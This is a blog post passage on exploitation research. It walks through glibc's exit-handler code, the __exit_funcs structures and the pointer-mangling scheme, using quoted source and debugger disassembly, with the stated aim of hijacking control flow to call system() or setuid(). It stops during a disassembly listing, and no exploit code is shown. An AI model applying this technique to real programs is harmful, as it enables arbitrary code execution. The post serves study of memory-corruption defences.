<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Notes on abusing exit handlers, bypassing pointer mangling and glibc ptmalloc hooks</title>
  <meta name="description" content="Hi,">

  <link rel="stylesheet" href="/binholic/assets/css/main.css">
  <link rel="canonical" href="/binholic/2017/05/20/notes-on-abusing-exit-handlers.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/binholic/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/binholic/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/binholic/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/binholic/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">Notes on abusing exit handlers, bypassing pointer mangling and glibc ptmalloc hooks</h1>
    <p class="post-meta"><time datetime="2017-05-20T23:08:00+02:00" itemprop="datePublished">May 20, 2017</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>Hi,</p>

<p>Today we’ll talk about abusing exit handlers in order to hijack the control flow.</p>

<p>This research stemmed from Google Project Zero article about heap overflow
NULL byte poisoning where they described using __exit_funcs or tls_dtor_list
to achieve code execution.
The issue I had was to find a way to resolve reliably these
non-exported symbols and access them.</p>

<p>The exit handlers are quite interesting as it is an easy version to do ROP
as they all take one parameter.
Functions such as setuid(), system() or other functions needing 1 parameter
can thus be easily called.</p>

<p>Pointer mangling is a mitigation implemented in order to thwart
direct function pointer corruption.
I’ll show in this post how it can be bypassed.</p>

<p>We’ll first analyze the code leading to the execution of these exit handlers
and then show how to trigger them.
There will be a lot of pasted listing ahead, these will be explained as we go.</p>

<p>Where is the code leading to executing these exit handlers?</p>

<h1 id="about-exit-">About exit ()</h1>

<p>Whenever we call libc exit(), it calls all the handlers we registered
with atexit() and on_exit() before calling the _exit() syscall.</p>

<p>This is located in “glibc/stdlib/exit.c”.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="code"><pre><span class="kt">void</span>
<span class="nf">exit</span> <span class="p">(</span><span class="kt">int</span> <span class="n">status</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__run_exit_handlers</span> <span class="p">(</span><span class="n">status</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__exit_funcs</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>exit() is just a nicely named wrapper for “__run_exit_handlers()”.</p>

<p>Let’s look at __run_exit_handlers():</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre></td><td class="code"><pre><span class="cm">/* Call all functions registered with `atexit' and `on_exit',
   in the reverse of the order in which they were registered
   perform stdio cleanup, and terminate program execution with STATUS.  */</span>
<span class="kt">void</span>
<span class="n">attribute_hidden</span>
<span class="nf">__run_exit_handlers</span> <span class="p">(</span><span class="kt">int</span> <span class="n">status</span><span class="p">,</span> <span class="k">struct</span> <span class="n">exit_function_list</span> <span class="o">**</span><span class="n">listp</span><span class="p">,</span>
       <span class="n">bool</span> <span class="n">run_list_atexit</span><span class="p">,</span> <span class="n">bool</span> <span class="n">run_dtors</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* First, call the TLS destructors.  */</span>
<span class="cp">#ifndef SHARED
</span>  <span class="k">if</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">__call_tls_dtors</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
<span class="cp">#endif
</span>    <span class="k">if</span> <span class="p">(</span><span class="n">run_dtors</span><span class="p">)</span>
      <span class="n">__call_tls_dtors</span> <span class="p">();</span>

  <span class="cm">/* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */</span>
  <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">listp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">struct</span> <span class="n">exit_function_list</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="o">*</span><span class="n">listp</span><span class="p">;</span>

      <span class="k">while</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="k">const</span> <span class="k">struct</span> <span class="n">exit_function</span> <span class="o">*</span><span class="k">const</span> <span class="n">f</span> <span class="o">=</span>
     <span class="o">&amp;</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">fns</span><span class="p">[</span><span class="o">--</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">];</span>
   <span class="k">switch</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">flavor</span><span class="p">)</span>
     <span class="p">{</span>
       <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">atfct</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">);</span>
       <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">onfct</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span> <span class="n">status</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">);</span>
       <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">cxafct</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="kt">int</span> <span class="n">status</span><span class="p">);</span>

     <span class="k">case</span> <span class="n">ef_free</span><span class="p">:</span>
     <span class="k">case</span> <span class="n">ef_us</span><span class="p">:</span>
       <span class="k">break</span><span class="p">;</span>
     <span class="k">case</span> <span class="n">ef_on</span><span class="p">:</span>
       <span class="n">onfct</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">.</span><span class="n">on</span><span class="p">.</span><span class="n">fn</span><span class="p">;</span>
<span class="cp">#ifdef PTR_DEMANGLE
</span>       <span class="n">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">onfct</span><span class="p">);</span>
<span class="cp">#endif
</span>       <span class="n">onfct</span> <span class="p">(</span><span class="n">status</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">.</span><span class="n">on</span><span class="p">.</span><span class="n">arg</span><span class="p">);</span>
       <span class="k">break</span><span class="p">;</span>
     <span class="k">case</span> <span class="n">ef_at</span><span class="p">:</span>
       <span class="n">atfct</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">.</span><span class="n">at</span><span class="p">;</span>
<span class="cp">#ifdef PTR_DEMANGLE
</span>       <span class="n">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">atfct</span><span class="p">);</span>
<span class="cp">#endif
</span>       <span class="n">atfct</span> <span class="p">();</span>
       <span class="k">break</span><span class="p">;</span>
     <span class="k">case</span> <span class="n">ef_cxa</span><span class="p">:</span>
       <span class="n">cxafct</span> <span class="o">=</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">.</span><span class="n">cxa</span><span class="p">.</span><span class="n">fn</span><span class="p">;</span>
<span class="cp">#ifdef PTR_DEMANGLE
</span>       <span class="n">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">cxafct</span><span class="p">);</span>
<span class="cp">#endif
</span>       <span class="n">cxafct</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">.</span><span class="n">cxa</span><span class="p">.</span><span class="n">arg</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
       <span class="k">break</span><span class="p">;</span>
     <span class="p">}</span>
 <span class="p">}</span>

      <span class="o">*</span><span class="n">listp</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">listp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
 <span class="cm">/* Don't free the last element in the chain, this is the statically
    allocate element.  */</span>
 <span class="n">free</span> <span class="p">(</span><span class="n">cur</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">run_list_atexit</span><span class="p">)</span>
    <span class="n">RUN_HOOK</span> <span class="p">(</span><span class="n">__libc_atexit</span><span class="p">,</span> <span class="p">());</span>

  <span class="n">_exit</span> <span class="p">(</span><span class="n">status</span><span class="p">);</span>
<span class="p">}</span></pre></td></tr></tbody></table></code></pre></figure>

<p>We can see that “__run_exit_handlers()” does use pointer demangling by using
PTR_DEMANGLE() before dereferencing the function pointers and calling
the pointed code.
We will thus need to analyze how the mangling and demangling is done in order
to bypass it.</p>

<p>We first see that it tries to call “__call_tls_dtors()”, this is interesting
as this called function is used to call destructors in tls_dtor_list,
we’ll come back to it.</p>

<p>Let’s look what a ‘struct exit_function_list’ look like.</p>

<p>This is located in “glibc/stdlib/exit.h”.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="code"><pre><span class="k">enum</span>
<span class="p">{</span>
  <span class="n">ef_free</span><span class="p">,</span> <span class="cm">/* `ef_free' MUST be zero!  */</span>
  <span class="n">ef_us</span><span class="p">,</span>
  <span class="n">ef_on</span><span class="p">,</span>
  <span class="n">ef_at</span><span class="p">,</span>
  <span class="n">ef_cxa</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">exit_function</span>
  <span class="p">{</span>
    <span class="cm">/* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */</span>
    <span class="kt">long</span> <span class="kt">int</span> <span class="n">flavor</span><span class="p">;</span>
    <span class="k">union</span>
      <span class="p">{</span>
 <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">at</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">);</span>
 <span class="k">struct</span>
   <span class="p">{</span>
     <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span> <span class="n">status</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">);</span>
     <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">;</span>
   <span class="p">}</span> <span class="n">on</span><span class="p">;</span>
 <span class="k">struct</span>
   <span class="p">{</span>
     <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="kt">int</span> <span class="n">status</span><span class="p">);</span>
     <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">;</span>
     <span class="kt">void</span> <span class="o">*</span><span class="n">dso_handle</span><span class="p">;</span>
   <span class="p">}</span> <span class="n">cxa</span><span class="p">;</span>
      <span class="p">}</span> <span class="n">func</span><span class="p">;</span>
  <span class="p">};</span>
<span class="k">struct</span> <span class="n">exit_function_list</span>
  <span class="p">{</span>
    <span class="k">struct</span> <span class="n">exit_function_list</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">idx</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">exit_function</span> <span class="n">fns</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  <span class="p">};</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Each handler can have 5 flavors : ef_free, ef_us, ef_on, ef_at and ef_cxa.
Depending on the flavor of the exit handler, we’ll have a function pointer,
argument and/or dso handle.
The function list can store at most 32 handlers and a linked list is created
if more is needed.
idx is the total number of functions and is 1-based (not 0-based as usually).</p>

<p>And our PTR_MANGLE() and PTR_DEMANGLE() definitions in “sysdeps/unix/sysv/linux/x86_64/sysdep.h”.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="cp">#  define PTR_MANGLE(var) asm ("xor %%fs:%c2, %0\n"        \
         "rol $2*" LP_SIZE "+1, %0"        \
         : "=r" (var)         \
         : "0" (var),         \
           "i" (offsetof (tcbhead_t,       \
            pointer_guard)))
#  define PTR_DEMANGLE(var) asm ("ror $2*" LP_SIZE "+1, %0\n"       \
         "xor %%fs:%c2, %0"         \
         : "=r" (var)         \
         : "0" (var),         \
           "i" (offsetof (tcbhead_t,       \
            pointer_guard)))</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Here we can see that it uses the “pointer_guard” offset in
the structure “tcbhead_t” in order to access the pointer_guard in fs,
this will be fs:0x30 on 64-bits machines.</p>

<p>The assembly of “__run_exit_handlers()”.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre></td><td class="code"><pre>pwndbg&gt; disassemble __run_exit_handlers
Dump of assembler code for function __run_exit_handlers:
   0x0000000000039f10 &lt;+0&gt;: push   r13
   0x0000000000039f12 &lt;+2&gt;: push   r12
   0x0000000000039f14 &lt;+4&gt;: mov    r12d,edx
   0x0000000000039f17 &lt;+7&gt;: push   rbp
   0x0000000000039f18 &lt;+8&gt;: push   rbx
   0x0000000000039f19 &lt;+9&gt;: mov    rbp,rsi
   0x0000000000039f1c &lt;+12&gt;: mov    ebx,edi
   0x0000000000039f1e &lt;+14&gt;: sub    rsp,0x8
   0x0000000000039f22 &lt;+18&gt;: call   0x3a5c0 &lt;__gi___call_tls_dtors&gt;
   0x0000000000039f27 &lt;+23&gt;: mov    r13,QWORD PTR [rbp+0x0]
   0x0000000000039f2b &lt;+27&gt;: test   r13,r13
   0x0000000000039f2e &lt;+30&gt;: je     0x39f80 &lt;__run_exit_handlers&gt;
   0x0000000000039f30 &lt;+32&gt;: mov    rax,QWORD PTR [r13+0x8]
   0x0000000000039f34 &lt;+36&gt;: mov    rdx,rax
   0x0000000000039f37 &lt;+39&gt;: shl    rdx,0x5
   0x0000000000039f3b &lt;+43&gt;: test   rax,rax
   0x0000000000039f3e &lt;+46&gt;: lea    rcx,[r13+rdx*1-0x10]
   0x0000000000039f43 &lt;+51&gt;: je     0x39f6f &lt;__run_exit_handlers&gt;
   0x0000000000039f45 &lt;+53&gt;: sub    rax,0x1
   0x0000000000039f49 &lt;+57&gt;: mov    QWORD PTR [r13+0x8],rax
   0x0000000000039f4d &lt;+61&gt;: mov    rdx,QWORD PTR [rcx]
   0x0000000000039f50 &lt;+64&gt;: cmp    rdx,0x3
   0x0000000000039f54 &lt;+68&gt;: je     0x3a000 &lt;__run_exit_handlers&gt;
 ; ef_cxa
   0x0000000000039f5a &lt;+74&gt;: cmp    rdx,0x4
   0x0000000000039f5e &lt;+78&gt;: je     0x39fd8 &lt;__run_exit_handlers&gt;

   0x0000000000039f60 &lt;+80&gt;: cmp    rdx,0x2
   0x0000000000039f64 &lt;+84&gt;: je     0x39fb0 &lt;__run_exit_handlers&gt;
   0x0000000000039f66 &lt;+86&gt;: sub    rcx,0x20
   0x0000000000039f6a &lt;+90&gt;: test   rax,rax
   0x0000000000039f6d &lt;+93&gt;: jne    0x39f45 &lt;__run_exit_handlers&gt;
   0x0000000000039f6f &lt;+95&gt;: mov    rax,QWORD PTR [r13+0x0]
   0x0000000000039f73 &lt;+99&gt;: test   rax,rax
   0x0000000000039f76 &lt;+102&gt;: mov    QWORD PTR [rbp+0x0],rax
   0x0000000000039f7a &lt;+106&gt;: jne    0x3a01d &lt;__run_exit_handlers&gt;
   0x0000000000039f80 &lt;+112&gt;: test   r12b,r12b
   0x0000000000039f83 &lt;+115&gt;: je     0x39fa4 &lt;__run_exit_handlers&gt;
   0x0000000000039f85 &lt;+117&gt;: lea    rbp,[rip+0x38594c]        # 0x3bf8d8 &lt;__elf_set___libc_atexit_element__io_cleanup__&gt;
   0x0000000000039f8c &lt;+124&gt;: lea    r12,[rip+0x38594d]        # 0x3bf8e0 &lt;__elf_set___libc_thread_subfreeres_element_arena_thread_freeres__&gt;
   0x0000000000039f93 &lt;+131&gt;: cmp    rbp,r12
   0x0000000000039f96 &lt;+134&gt;: jae    0x39fa4 &lt;__run_exit_handlers&gt;
   0x0000000000039f98 &lt;+136&gt;: call   QWORD PTR [rbp+0x0]
   0x0000000000039f9b &lt;+139&gt;: add    rbp,0x8
   0x0000000000039f9f &lt;+143&gt;: cmp    rbp,r12
   0x0000000000039fa2 &lt;+146&gt;: jb     0x39f98 &lt;__run_exit_handlers&gt;
   0x0000000000039fa4 &lt;+148&gt;: mov    edi,ebx
   0x0000000000039fa6 &lt;+150&gt;: call   0xcbb60 &lt;__gi__exit&gt;
   0x0000000000039fab &lt;+155&gt;: nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000039fb0 &lt;+160&gt;: shl    rax,0x5
   0x0000000000039fb4 &lt;+164&gt;: mov    edi,ebx
   0x0000000000039fb6 &lt;+166&gt;: add    rax,r13
   0x0000000000039fb9 &lt;+169&gt;: mov    rdx,QWORD PTR [rax+0x18]
   0x0000000000039fbd &lt;+173&gt;: mov    rsi,QWORD PTR [rax+0x20]
   0x0000000000039fc1 &lt;+177&gt;: ror    rdx,0x11
   0x0000000000039fc5 &lt;+181&gt;: xor    rdx,QWORD PTR fs:0x30
   0x0000000000039fce &lt;+190&gt;: call   rdx
   0x0000000000039fd0 &lt;+192&gt;: jmp    0x39f30 &lt;__run_exit_handlers&gt;
   0x0000000000039fd5 &lt;+197&gt;: nop    DWORD PTR [rax]

 ; ef_cxa
   0x0000000000039fd8 &lt;+200&gt;: shl    rax,0x5
   0x0000000000039fdc &lt;+204&gt;: mov    esi,ebx
   0x0000000000039fde &lt;+206&gt;: add    rax,r13
   0x0000000000039fe1 &lt;+209&gt;: mov    rdx,QWORD PTR [rax+0x18]
   0x0000000000039fe5 &lt;+213&gt;: mov    rdi,QWORD PTR [rax+0x20]
   0x0000000000039fe9 &lt;+217&gt;: ror    rdx,0x11
   0x0000000000039fed &lt;+221&gt;: xor    rdx,QWORD PTR fs:0x30
   0x0000000000039ff6 &lt;+230&gt;: call   rdx
   0x0000000000039ff8 &lt;+232&gt;: jmp    0x39f30 &lt;__run_exit_handlers&gt;
   0x0000000000039ffd &lt;+237&gt;: nop    DWORD PTR [rax]
   0x000000000003a000 &lt;+240&gt;: shl    rax,0x5
   0x000000000003a004 &lt;+244&gt;: mov    rax,QWORD PTR [r13+rax*1+0x18]
   0x000000000003a009 &lt;+249&gt;: ror    rax,0x11
   0x000000000003a00d &lt;+253&gt;: xor    rax,QWORD PTR fs:0x30
   0x000000000003a016 &lt;+262&gt;: call   rax
   0x000000000003a018 &lt;+264&gt;: jmp    0x39f30 &lt;__run_exit_handlers&gt;
   0x000000000003a01d &lt;+269&gt;: mov    rdi,r13
   0x000000000003a020 &lt;+272&gt;: call   0x1f8a8
   0x000000000003a025 &lt;+277&gt;: jmp    0x39f27 &lt;__run_exit_handlers&gt;
End of assembler dump.</pre></td></tr></tbody></table></code></pre></figure>

<p>In case you missed it, the code that really interest us is this:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="code"><pre>   0x0000000000039fe9 &lt;+217&gt;: ror    rdx,0x11
   0x0000000000039fed &lt;+221&gt;: xor    rdx,QWORD PTR fs:0x30
   0x0000000000039ff6 &lt;+230&gt;: call   rdx</pre></td></tr></tbody></table></code></pre></figure>

<p>So what’s stored at fs:X?
Let’s look at Thread Control Block.</p>
<h1 id="about-thread-control-block">About Thread Control Block</h1>

<p>Like we saw in PTR_MANGLE() and PTR_DEMANGLE(), it all has to do with
the structure “tcbhead_t”.
This structure is what’s stored at FS, which correspond to the per thread data
(TCB probably for Thread Control Block).</p>

<p>So at fs:0x30 we get the pointer_guard.</p>

<p>It’s the pointer guard as defined in “sysdeps/x86_64/nptl/tls.h” in the
structure “tcbhead_t”.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="code"><pre><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">tcb</span><span class="p">;</span>  <span class="cm">/* Pointer to the TCB.  Not necessarily the
      thread descriptor used by libpthread.  */</span>
  <span class="n">dtv_t</span> <span class="o">*</span><span class="n">dtv</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">self</span><span class="p">;</span>  <span class="cm">/* Pointer to the thread descriptor.  */</span>
  <span class="kt">int</span> <span class="n">multiple_threads</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">gscope_flag</span><span class="p">;</span>
  <span class="kt">uintptr_t</span> <span class="n">sysinfo</span><span class="p">;</span>
  <span class="kt">uintptr_t</span> <span class="n">stack_guard</span><span class="p">;</span>
  <span class="kt">uintptr_t</span> <span class="n">pointer_guard</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">vgetcpu_cache</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<span class="cp"># ifndef __ASSUME_PRIVATE_FUTEX
</span>  <span class="kt">int</span> <span class="n">private_futex</span><span class="p">;</span>
<span class="cp"># else
</span>  <span class="kt">int</span> <span class="n">__glibc_reserved1</span><span class="p">;</span>
<span class="cp"># endif
</span>  <span class="kt">int</span> <span class="n">__glibc_unused1</span><span class="p">;</span>
  <span class="cm">/* Reservation of some values for the TM ABI.  */</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__private_tm</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="cm">/* GCC split stack support.  */</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">__private_ss</span><span class="p">;</span>
  <span class="kt">long</span> <span class="kt">int</span> <span class="n">__glibc_reserved2</span><span class="p">;</span>
  <span class="cm">/* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>
  <span class="n">__128bits</span> <span class="n">__glibc_unused2</span><span class="p">[</span><span class="mi">8</span><span class="p">][</span><span class="mi">4</span><span class="p">]</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">aligned</span> <span class="p">(</span><span class="mi">32</span><span class="p">)));</span>

  <span class="kt">void</span> <span class="o">*</span><span class="n">__padding</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span> <span class="n">tcbhead_t</span><span class="p">;</span></pre></td></tr></tbody></table></code></pre></figure>

<h1 id="where-is-that-pointer_guard-setted-up">Where is that pointer_guard setted up?</h1>

<p>It’s setted up in “csu/libc-start.c”.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="code"><pre>  <span class="cm">/* Set up the pointer guard value.  */</span>
  <span class="kt">uintptr_t</span> <span class="n">pointer_chk_guard</span> <span class="o">=</span> <span class="n">_dl_setup_pointer_guard</span> <span class="p">(</span><span class="n">_dl_random</span><span class="p">,</span>
        <span class="n">stack_chk_guard</span><span class="p">);</span>
<span class="cp"># ifdef THREAD_SET_POINTER_GUARD
</span>  <span class="n">THREAD_SET_POINTER_GUARD</span> <span class="p">(</span><span class="n">pointer_chk_guard</span><span class="p">);</span>
<span class="cp"># else
</span>  <span class="n">__pointer_chk_guard_local</span> <span class="o">=</span> <span class="n">pointer_chk_guard</span><span class="p">;</span>
<span class="cp"># endif</span></pre></td></tr></tbody></table></code></pre></figure>

<p>We could go look the code at “_dl_setup_pointer_guard()” but research was not
done there.</p>

<p>We still need to determine where we can hit and overwrite these handlers.
Let’s start with __exit_funcs.</p>

<h1 id="about-atexit-and-finding-__exit_funcs">About atexit() and finding __exit_funcs</h1>
<p>The “atexit()” code is located in “cxa_atexit.c”</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="cm">/* Register a function to be called by exit or when a shared library
   is unloaded.  This function is only called from code generated by
   the C++ compiler.  */</span>
<span class="kt">int</span>
<span class="nf">__cxa_atexit</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">),</span> <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">d</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">__internal_atexit</span> <span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">arg</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__exit_funcs</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">ibc_hidden_def</span> <span class="p">(</span><span class="n">__cxa_atexit</span><span class="p">)</span></pre></td></tr></tbody></table></code></pre></figure>

<p>And the corresponding assembly.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="code"><pre>pwndbg&gt; disassemble __cxa_atexit 
Dump of assembler code for function __GI___cxa_atexit:
   0x000000000003a280 &lt;+0&gt;: push   r12
   0x000000000003a282 &lt;+2&gt;: push   rbp
   0x000000000003a283 &lt;+3&gt;: mov    r12,rsi
   0x000000000003a286 &lt;+6&gt;: push   rbx
   0x000000000003a287 &lt;+7&gt;: mov    rbx,rdi
   0x000000000003a28a &lt;+10&gt;: lea    rdi,[rip+0x389367]        # 0x3c35f8 &lt;__exit_funcs&gt;
   0x000000000003a291 &lt;+17&gt;: mov    rbp,rdx
   0x000000000003a294 &lt;+20&gt;: call   0x3a0a0 &lt;__new_exitfn&gt;
   0x000000000003a299 &lt;+25&gt;: test   rax,rax
   0x000000000003a29c &lt;+28&gt;: je     0x3a2c8 &lt;__gi___cxa_atexit&gt;
   0x000000000003a29e &lt;+30&gt;: mov    rdi,rbx
   0x000000000003a2a1 &lt;+33&gt;: mov    QWORD PTR [rax+0x10],r12
   0x000000000003a2a5 &lt;+37&gt;: mov    QWORD PTR [rax+0x18],rbp
   0x000000000003a2a9 &lt;+41&gt;: xor    rdi,QWORD PTR fs:0x30
   0x000000000003a2b2 &lt;+50&gt;: rol    rdi,0x11
   0x000000000003a2b6 &lt;+54&gt;: mov    QWORD PTR [rax+0x8],rdi
   0x000000000003a2ba &lt;+58&gt;: mov    QWORD PTR [rax],0x4
   0x000000000003a2c1 &lt;+65&gt;: xor    eax,eax
   0x000000000003a2c3 &lt;+67&gt;: pop    rbx
   0x000000000003a2c4 &lt;+68&gt;: pop    rbp
   0x000000000003a2c5 &lt;+69&gt;: pop    r12
   0x000000000003a2c7 &lt;+71&gt;: ret    
